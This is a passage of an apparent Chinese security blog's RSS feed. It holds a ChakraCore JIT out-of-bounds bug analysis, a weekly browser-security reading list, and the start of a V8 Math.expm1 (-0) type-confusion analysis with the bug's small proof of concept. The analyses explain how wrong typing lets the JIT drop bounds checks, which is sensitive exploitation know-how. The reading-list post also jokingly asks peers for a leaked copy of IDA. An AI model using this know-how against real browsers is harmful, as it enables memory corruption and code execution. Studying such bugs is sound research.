000002E734590179  sub         r9d,r8d  
000002E73459017C  mov         rcx,2E634345648h  
000002E734590186  mov         rax,7FFBCFCF5A70h  
000002E734590190  call        rax  
000002E734590193  jmp         000002E7345901B1  
000002E734590195  mov         edx,r9d  
000002E734590198  bts         rdx,30h  
000002E73459019D  mov         rax,rdx  
000002E7345901A0  mov         qword ptr [r12+170h],rax  
000002E7345901A8  mov         dword ptr [rdi],ecx  
000002E7345901AA  mov         rax,26h  
000002E7345901B1  add         rsp,28h  
000002E7345901B5  pop         rbx  
000002E7345901B7  pop         rsi  
000002E7345901B9  pop         rdi  
000002E7345901BB  pop         r12  
000002E7345901BD  pop         r13  
000002E7345901BF  pop         r14  
000002E7345901C1  pop         r15  
000002E7345901C3  mov         rsp,rbp  
000002E7345901C6  pop         rbp  
000002E7345901C8  ret  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里我们不过多的讨论优化的流程和细节，通过调用堆栈知道当前漏洞代码所处的位置即可&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;k
 索引     函数      
--------------------------------------------------------------------------------
*1      ChakraCore.dll!GlobOpt::OptArraySrc(IR::Instr * * const instrRef)
 2      ChakraCore.dll!GlobOpt::OptInstr(IR::Instr * &amp;amp; instr, bool * isInstrRemoved)
 3      ChakraCore.dll!GlobOpt::OptBlock(BasicBlock * block)
 4      ChakraCore.dll!GlobOpt::ForwardPass()
 5      ChakraCore.dll!GlobOpt::Optimize()
 6      ChakraCore.dll!Func::TryCodegen()
 7      ChakraCore.dll!Func::Codegen(Memory::JitArenaAllocator * alloc, JITTimeWorkItem * workItem, ThreadContextInfo * threadContextInfo, ScriptContextInfo * scriptContextInfo, JITOutputIDL * outputData, Js::EntryPointInfo * epInfo, const FunctionJITRuntimeInfo * const runtimeInfo, JITTimePolymorphicInlineCacheInfo * const polymorphicInlineCacheInfo, void * const codeGenAllocators, Js::ScriptContextProfiler * const codeGenProfiler, const bool isBackgroundJIT)
 8      ChakraCore.dll!NativeCodeGenerator::CodeGen(Memory::PageAllocatorBase&amp;lt;Memory::VirtualAllocWrapper,Memory::SegmentBase&amp;lt;Memory::VirtualAllocWrapper&amp;gt;,Memory::PageSegmentBase&amp;lt;Memory::VirtualAllocWrapper&amp;gt; &amp;gt; * pageAllocator, CodeGenWorkItem * workItem, const bool foreground)
 9      ChakraCore.dll!NativeCodeGenerator::Process(JsUtil::Job * const job, JsUtil::ParallelThreadData * threadData)
 10     ChakraCore.dll!JsUtil::BackgroundJobProcessor::Process(JsUtil::Job * const job, JsUtil::ParallelThreadData * threadData)
 11     ChakraCore.dll!JsUtil::BackgroundJobProcessor::Run(JsUtil::ParallelThreadData * threadData)
 12     ChakraCore.dll!JsUtil::BackgroundJobProcessor::StaticThreadProc(void * lpParam)
 13     ChakraCore.dll!invoke_thread_procedure(unsigned int(*)(void *) procedure, void * const context)
 14     ChakraCore.dll!thread_start&amp;lt;unsigned int (__cdecl*)(void * __ptr64)&amp;gt;(void * const parameter)
 15     [外部代码]  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们知道了漏洞代码所处的位置，现在来分析漏洞的成因&lt;/p&gt;

&lt;p&gt;Patch后的代码，我通过调试打印出了运行时的变量数据&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (baseValueType.IsLikelyOptimizedVirtualTypedArray() &amp;amp;&amp;amp; !Js::IsSimd128LoadStore(instr-&amp;gt;m_opcode) /*Always extract bounds for SIMD */)
{
    if (isProfilableStElem ||
        !instr-&amp;gt;IsDstNotAlwaysConvertedToInt32() ||
        ( (baseValueType.GetObjectType() == ObjectType::Float32VirtualArray ||
            baseValueType.GetObjectType() == ObjectType::Float64VirtualArray) &amp;amp;&amp;amp;
            !instr-&amp;gt;IsDstNotAlwaysConvertedToNumber()
        )
        )
    {
        // Unless we're in asm.js (where it is guaranteed that virtual typed array accesses cannot read/write beyond 4GB),
        // check the range of the index to make sure we won't access beyond the reserved memory beforing eliminating bounds
        // checks in jitted code.
        if (!GetIsAsmJSFunc())
        {
            // idxOpnd = 0x000001dae1efc4e0 {m_sym=0x000001dae1efc030 {byteCodeRegSlot=0x00000006 byteCodeFunc=0x00000055e1ffef60 {...} } ...}	IR::RegOpnd *
            IR::RegOpnd * idxOpnd = baseOwnerIndir-&amp;gt;GetIndexOpnd();
            if (idxOpnd)
            {
                // idxSym = 0x000001dae1ef2560 {byteCodeRegSlot=0x00000006 byteCodeFunc=0x00000055e1ffef60 {m_alloc=0x00000055e1fff8f0 {...} ...} }	StackSym * {ByteCodeStackSym}
                StackSym * idxSym = idxOpnd-&amp;gt;m_sym-&amp;gt;IsTypeSpec() ? idxOpnd-&amp;gt;m_sym-&amp;gt;GetVarEquivSym(nullptr) : idxOpnd-&amp;gt;m_sym;
                // idxValue = 0x000001dae1efda00 {valueNumber=0x00000010 valueInfo=0x000001dae1efbfa0 {bounds=0x000001dae1efbeb0 {...} ...} }	Value *
                Value * idxValue = FindValue(idxSym);
                // idxConstantBounds = {lowerBound=0x00000000 upperBound=0x00000000 }	IntConstantBounds
                IntConstantBounds idxConstantBounds;
                // idxConstantBounds = {lowerBound=0x80000000 upperBound=0x7ffffffe }	IntConstantBounds
                if (idxValue &amp;amp;&amp;amp; idxValue-&amp;gt;GetValueInfo()-&amp;gt;TryGetIntConstantBounds(&amp;amp;idxConstantBounds))
                {
                    // indirScale = 0x02 '\x2'	unsigned char
                    BYTE indirScale = Lowerer::GetArrayIndirScale(baseValueType);
                    // upperBound = 0x7ffffffe	int
                    int32 upperBound = idxConstantBounds.UpperBound();
                    // lowerBound = 0x80000000	int
                    int32 lowerBound = idxConstantBounds.LowerBound();
                    // 关键的一个判断
                    // lowerBound &amp;gt;= 0：下边界大于0
                    // (static_cast&amp;lt;uint64&amp;gt;(upperBound) &amp;lt;&amp;lt; indirScale：表示数组最大长度*数组元素大小，这里indirScale的值为0x02，表示一个元素占用4字节
                    // #define MAX_ASMJS_ARRAYBUFFER_LENGTH 0x100000000 //4GB
                    // 所以整个判断的核心就是：判断边界的时候，需要以数组长度*元素大小来判断
                    // 猜测：该漏洞应该是没有做4GB的判断，导致数组长度*元素大小超过4GB，访问的时候就越界了
                    if (lowerBound &amp;gt;= 0 &amp;amp;&amp;amp; ((static_cast&amp;lt;uint64&amp;gt;(upperBound) &amp;lt;&amp;lt; indirScale) &amp;lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))
                    {
                        eliminatedLowerBoundCheck = true;
                        eliminatedUpperBoundCheck = true;
                        canBailOutOnArrayAccessHelperCall = false;
                    }
                }
            }
        }
        else
        {
            eliminatedLowerBoundCheck = true;
            eliminatedUpperBoundCheck = true;
            canBailOutOnArrayAccessHelperCall = false;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;猜测归猜测，具体还是要落实到代码来理解，找到Poc里创建&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArrayBuffer&lt;/code&gt;的代码&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;JavascriptArrayBuffer::JavascriptArrayBuffer(uint32 length, DynamicType * type) :
    ArrayBuffer(length, type, (IsValidVirtualBufferLength(length)) ? AllocWrapper : malloc)
{
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;打个断点&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;length	0x00010000	unsigned int
Js::Type	{typeId=TypeIds_ArrayBuffer (0x00000029) flags=TypeFlagMask_None (0x00 '\0') javascriptLibrary=0x000002867b148000 {...} ...}	Js::Type
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/604C692F7F9373AA6ABA06071D68AF94.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在创建数组的代码里，我们看到有一个判断，这里要走入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WIN64&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bool JavascriptArrayBuffer::IsValidVirtualBufferLength(uint length)
{
#if _WIN64
    /*
    1. length &amp;gt;= 2^16
    2. length is power of 2 or (length &amp;gt; 2^24 and length is multiple of 2^24)
    3. length is a multiple of 4K
    */
    return (!PHASE_OFF1(Js::TypedArrayVirtualPhase) &amp;amp;&amp;amp;
        (length &amp;gt;= 0x10000) &amp;amp;&amp;amp;
        (((length &amp;amp; (~length + 1)) == length) ||
        (length &amp;gt;= 0x1000000 &amp;amp;&amp;amp;
        ((length &amp;amp; 0xFFFFFF) == 0)
        )
        ) &amp;amp;&amp;amp;
        ((length % AutoSystemInfo::PageSize) == 0)
        );
#else
    return false;
#endif
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;一共是如下几个判断，主要是长度大于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10000&lt;/code&gt;且页对齐&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. length &amp;gt;= 2^16
2. length is power of 2 or (length &amp;gt; 2^24 and length is multiple of 2^24)
3. length is a multiple of 4K

!PHASE_OFF1(Js::TypedArrayVirtualPhase)
length &amp;gt;= 0x10000：我们创建的长度为0x10000，满足，这也就是为什么长度为0x10000的原因
((length &amp;amp; (~length + 1)) == length) || (length &amp;gt;= 0x1000000 &amp;amp;&amp;amp; ((length &amp;amp; 0xFFFFFF) == 0))
(length % AutoSystemInfo::PageSize) == 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;条件满足就使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AllocWrapper&lt;/code&gt;来分配内存，根据定义，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AllocWrapper&lt;/code&gt;会调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualAlloc&lt;/code&gt;来分配内存，首先是申请地址，使用4GB的保留空间&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MEM_RESERVE&lt;/code&gt;，然后使用实际的数组长度进行提交&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MEM_COMMIT&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define MAX_ASMJS_ARRAYBUFFER_LENGTH 0x100000000 //4GB

static void*__cdecl  AllocWrapper(DECLSPEC_GUARD_OVERFLOW size_t length)
{
#if _WIN64
    // 4GB的保留空间
    LPVOID address = VirtualAlloc(nullptr, MAX_ASMJS_ARRAYBUFFER_LENGTH, MEM_RESERVE, PAGE_NOACCESS);
    //throw out of memory
    if (!address)
    {
        Js::Throw::OutOfMemory();
    }
    // 使用实际的数组长度length进行提交
    LPVOID arrayAddress = VirtualAlloc(address, length, MEM_COMMIT, PAGE_READWRITE);
    if (!arrayAddress)
    {
        VirtualFree(address, 0, MEM_RELEASE);
        Js::Throw::OutOfMemory();
    }
    return arrayAddress;
#else
    Assert(false);
    return nullptr;
#endif
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;到这里，我们可以结合补丁的Message进行猜测，开发者会以为超过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10000&lt;/code&gt;的数组使用了4GB的保留空间会很安全，所以移除了边界检查，但是没有考虑到元素大小，导致OOB&lt;/p&gt;

&lt;p&gt;漏洞分析到这里就结束了，结束了吗？&lt;/p&gt;

&lt;p&gt;其实远没有结束，还有很多要思考的：ChakraCore的解释器流程更详细的分析，如何进入JIT，进入JIT之后都有哪些Phase，如何处理IR，更多的内部机制和特性等等&lt;/p&gt;

&lt;p&gt;好好学习:))&lt;/p&gt;

&lt;p&gt;大佬们带带弟弟吧，我学不动了:((&lt;/p&gt;
</description>
                <pubDate>Fri, 29 Nov 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/11/29/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.11.25-2019.11.29.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/11/29/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.11.25-2019.11.29.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.11.18 - 2019.11.22</title>
                <description>&lt;p&gt;上周的周报最后面说接下来学习下TrustZone，前几天有一篇高通芯片漏洞的文章&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://research.checkpoint.com/the-road-to-qualcomm-trustzone-apps-fuzzing/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其实今年六月份作者就已经作过相关的分享《The road to Qualcomm TrustZone apps fuzzing by Slava Makkaveev》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://cfp.recon.cx/media/tz_apps_fuzz.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;大概的意思就是：通过一系列漏洞对存在漏洞的TA进行Patch，使其计算的数据能够返回给REE，这样就可以曲线救国在REE侧对TEE进行Fuzz，更加具体的操作细节我还在跟李神探学习，希望之后能够单独写一系列文章讲讲TrustZone相关的漏洞分析及安全防护技术&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/AA7B10AB696D934E8922D3B226841B43.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/F1158249EDD0B566E40780C161CB329C.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这个会议所有的议题Slide可以在这下载&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://cfp.recon.cx/reconmtl2019/talk/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;2019 POC关于Safari的议题，来自Blade Team&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://powerofcommunity.net/poc2019/Zhiyang.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;哈喽，ChakraCore:))&lt;/p&gt;

&lt;p&gt;现在学习浏览器的环境真好，随处都是资料&lt;/p&gt;

&lt;p&gt;官方文档&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/Microsoft/ChakraCore/wiki/Architecture-Overview&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;有两个很不错的议题&lt;/p&gt;

&lt;p&gt;Using the JIT vulnerability to Pwning Microsoft Edge&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Li-Using-the-JIT-Vulnerability-to-Pwning-Microsoft-Edge.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Attacking Edge Through the JavaScript Just-In-Time Compiler&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/bkth/Attacking-Edge-Through-the-JavaScript-Compiler/blob/master/pres.pdf&lt;/li&gt;
  &lt;li&gt;https://www.youtube.com/watch?v=r4J7Zu1RV40&lt;/li&gt;
  &lt;li&gt;https://www.youtube.com/watch?v=lBL4KGIybWE&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;下面的文章我现在是打印出来每天上下班地铁上读，来回快两小时不用起来怪可惜的，然后睡前再看个半小时，感谢我司免费打印！&lt;/p&gt;

&lt;p&gt;0x9A82 - Edge Type Confusion利用：从type confused到内存读写&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.anquanke.com/post/id/98774&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;0x9A82 - Edge Type Confusion利用：从内存读写到控制流程&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.anquanke.com/post/id/98775&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;0x9A82 - 对Edge浏览器的js解析引擎Chakra漏洞CVE-2017-8548的分析&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.anquanke.com/post/id/87322&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;zs0zrc - CVE-2018-8372&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://zszcr.github.io/2019/06/01/2019-6-1-CVE-2018-8372/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;zs0zrc - ChakraCore基础知识笔记&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://zszcr.github.io/2019/05/28/2019-5-28-ChakraCore%E5%9F%BA%E7%A1%80/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;walkerfuz - 从CVE-2018-8355零基础学Chakracore漏洞利用&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.codercto.com/a/85300.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;sakura - case study:cve-2017-0234&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;elli0tn0phacker - Chakra漏洞调试笔记1 - ImplicitCall&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.anquanke.com/post/id/180551&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;elli0tn0phacker - Chakra漏洞调试笔记2 - OpCode Side Effect&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.anquanke.com/post/id/183127&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;elli0tn0phacker - Chakra漏洞调试笔记3 - MissingValue&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.anquanke.com/post/id/184258&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;elli0tn0phacker - Chakra漏洞调试笔记4 - Array OOB&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.anquanke.com/post/id/187739&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;elli0tn0phacker - Chakra漏洞调试笔记5 - CVE-2019-0861复现&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.anquanke.com/post/id/190533&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;今年Bluehat百度安全实验室关于挖掘Windows内核信息泄露的分享《如何在3个月发现12个内核信息泄露漏洞》，以下一个是视频，一个是Slide&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.microsoft.com/en-us/videoplayer/embed/RE3i0iZ&lt;/li&gt;
  &lt;li&gt;https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE37dLj&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;IDA最近的更新都让人很想买新的Release啊，不知道啥时候能有Leak，话说有段时间没有新的Leak了，师傅们给我来一份？&lt;/p&gt;

&lt;p&gt;关于使用新的接口来实现反混淆《Hex-Rays Microcode API vs. Obfuscating Compiler》，这个很强大，平时逆向协议比较多的同学可以重点关注&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://www.hexblog.com/?p=1248&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;再次读泉哥的《安全研究者的自我修养》，常看常新，能够反思自己这段时间是否按照过来人的建议去学习，改正没有做好的地方&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s?__biz=MzU0MzgzNTU0Mw==&amp;amp;mid=2247483913&amp;amp;idx=1&amp;amp;sn=2a0558592e072389e348dc8f7c6223d1&amp;amp;scene=21#wechat_redirect&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;第七条尤其有感触：&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;7、进入研究者团队或社区，互相学习
国外的交流氛围会比国内的更好一些，也更愿意分享。
很多时候自己的交流圈，大多是一些熟识的同行，或者同事，一般可交流的人还是比较少的。
经常在网上看到不少人会问，如何认识xx大牛、黑客，但其实很多时候却是：努力提高自己的专业能力，圈子最终会吸纳你进去认识更多圈内人。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我现在的技术还是太弱了，不够专注，学习的效率也不够高，希望能通过不断的学习来改进&lt;/p&gt;

&lt;p&gt;16寸的MacBook Pro，买不起的我只能YY一下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/EF2E6F1E686160CF6DBBF0EA16FC2A64.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最后，下个月就是圣诞节了，不知道给女朋友买什么圣诞礼物的，我这里有个建议：圣诞日历，有护肤，香氛，美妆，玩具，零食等多种类型，圣诞日历有24个格子，每个格子里面有这一家品牌自家这一年卖得比较好或者当家明星产品，不过一般都是Full Size和Travel Size组合，然后每天拆一个格子，就可以拆到平安夜，这个点不少品牌的日历都抢完了，可以去淘宝找代购或者海淘，老外真会玩&lt;/p&gt;

&lt;p&gt;话说我每次安全周报都写这么多东西，搞的好像每天上班我都在学习不干活一样，是不是酌情写一两句就好了:((&lt;/p&gt;
</description>
                <pubDate>Fri, 22 Nov 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/11/22/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.11.18-2019.11.22.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/11/22/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.11.18-2019.11.22.html</guid>
            </item>
        
            <item>
                <title>V8漏洞分析 - BUG-880207 Math.expm1进行JIT未正确处理-0类型</title>
                <description>&lt;p&gt;Issue 880207: Security: incorrect type information on Math.expm1&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=880207&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个漏洞一共有三个补丁，按照时间顺序排列如下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;commit	56f7dda67fdc9777719f71225494033f03aecc96	[log] [tgz]
author	Benedikt Meurer &amp;lt;bmeurer@chromium.org&amp;gt;	Tue Sep 04 19:49:43 2018
committer	Commit Bot &amp;lt;commit-bot@chromium.org&amp;gt;	Wed Sep 05 16:07:16 2018
tree	3eed5ea590a4656606c9e8136b1bdacb7036fab6
parent	408d89041e7a21f74b37294ebed59f88d357b9c1 [diff]

[turbofan] Fix incorrect typing rule for NumberExpm1.

The Math.expm1() function can actually return -0, for example in the
case that -0 is passed to it.

Bug: chromium:880207

-------------------------------

commit	c59c9c46b589deb2a41ba07cf87275921b8b2885	[log] [tgz]
author	Jaroslav Sevcik &amp;lt;jarin@chromium.org&amp;gt;	Mon Oct 15 05:20:38 2018
committer	Commit Bot &amp;lt;commit-bot@chromium.org&amp;gt;	Mon Oct 15 06:00:03 2018
tree	f636fcfcc7042b7234daec03bd0497a94a620cf2
parent	937719d5310376d367f97bb72e3f029f4da52e80 [diff]

[turbofan] Fix Math.expm1 builtin typing.

This fixes the typing for the case when the call is not lowered to
the simplified operator.

Bug: chromium:880207

-------------------------------

commit	76df2c50d0e37ab0c42d0d05a637afe999fffc49	[log] [tgz]
author	Benedikt Meurer &amp;lt;bmeurer@google.com&amp;gt;	Fri Nov 02 19:14:53 2018
committer	Commit Bot &amp;lt;commit-bot@chromium.org&amp;gt;	Fri Nov 02 19:16:25 2018
tree	96a74fb41bead81ab5a84dc55a8c8fd71147d659
parent	2ccad4a909e70def8989463ac668b168d6ff894a [diff]

Merged: [turbofan] Fix Math.expm1 builtin typing.

Revision: c59c9c46b589deb2a41ba07cf87275921b8b2885

BUG=chromium:880207
LOG=N
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
TBR=jarin@chromium.org
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;同时这个漏洞也是35C3 CTF的题目，大家可以到这里下载题目相关文件&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://35c3ctf.ccc.ac/uploads/krautflare-33ce1021f2353607a9d4cc0af02b0b28.tar&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在我调试的过程中，发现切换到第一个补丁的上一个commit之后，下面这个Poc可以使用，但是在利用这个漏洞进行边界检查移除的时候，却始终不能成功，转而使用题目给的方式，切换到十二月份的commit，再打上三个补丁就可以移除边界检查，这一点还有待解决，接下来以题目的角度来分析下这个漏洞&lt;/p&gt;

&lt;p&gt;Issue页面提供的Poc&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function foo() {
  return Object.is(Math.expm1(-0), -0);
}

console.log(foo());
%OptimizeFunctionOnNextCall(foo);
console.log(foo());

% d8 --allow-natives-syntax expm1-poc.js
true
false
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个漏洞是因为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Math.expm1&lt;/code&gt;在进行JIT优化的时候，未正确评估返回值的类型，漏了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;这个类型，在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Typer&lt;/code&gt;的时候，传播了错误的类型信息，Turbofan根据错误的类型信息去掉了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CheckBound&lt;/code&gt;这个节点，最后获得越界读写，造成了RCE&lt;/p&gt;

&lt;p&gt;在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Typer&lt;/code&gt;阶段，会对&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Math.expm1&lt;/code&gt;返回如下几个类型，我们可以看到，这里是没有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;这个类型的&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
    ...
    switch (function.shared().builtin_function_id()) {
        ...
        case BuiltinFunctionId::kMathAbs:
        case BuiltinFunctionId::kMathExp:
        case BuiltinFunctionId::kMathExpm1:
            return Type::Union(Type::PlainNumber(), Type::NaN(), t-&amp;gt;zone());
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们来看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Math.expm1&lt;/code&gt;的定义：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Refereance/Global_Objects/Math/expm1&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Math.expm1() 函数返回 E**x - 1, 其中 x 是该函数的参数, E 是自然对数的底数 2.718281828459045
Math.expm1(1)     // 1.7182818284590453
Math.expm1(-38)   // -1
Math.expm1(“-38”) // -1
Math.expm1(“foo”) // NaN&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;要是忘了幂运算，这里可以回顾一下：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;n = 0：a**n = 0&lt;/li&gt;
  &lt;li&gt;n &amp;gt; 0：a&lt;em&gt;*n = a&lt;/em&gt;a…*a&lt;/li&gt;
  &lt;li&gt;n &amp;lt; 0：1/(a**n)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;那我们传入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;会发生什么呢？&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;d8&amp;gt; Math.expm1(-0)
0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到终端输出的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;，如果我们用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Object.is&lt;/code&gt;来比较呢？&lt;/p&gt;
